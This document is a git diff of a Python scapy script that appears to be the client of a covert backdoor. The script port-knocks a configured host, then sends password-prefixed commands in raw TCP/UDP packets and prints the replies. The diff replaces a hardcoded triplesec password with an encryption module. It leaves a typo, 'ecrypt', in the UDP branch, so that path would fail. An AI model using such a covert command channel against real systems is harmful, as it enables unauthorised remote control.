@@ -1,16 +1,8 @@
 #!/usr/bin/python
 
-import time, triplesec, configfile, logging
+import time, configfile, logging, encryption
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
-
-def encrypt(data):
-    ciphertext = triplesec.encrypt(data, 'top-secret-pw')
-    return ciphertext
-
-def decrypt(data):
-    plaintext = triplesec.decrypt(data, 'top-secret-pw')
-    return plaintext
 
 def portKnock():
     for knock in configfile.knock:
@@ -20,14 +12,14 @@ def portKnock():
 
 def sendCommand(protocol, data, password):
     if protocol == "tcp":
-        packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=password+data)
+        packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.password))
     if protocol == "udp":
-        packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=password+data)
+        packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=encryption.ecrypt(password+data, configfile.password))
     send(packet)
 
 def recvCommand(packet):
    if packet.haslayer(IP) and packet.haslayer(Raw):
-        data = packet['Raw'].load
+        data = encryption.decrypt(packet['Raw'].load, configfile.password)
         if data.startswith(configfile.password):
             data = data[len(configfile.password):]
             print data
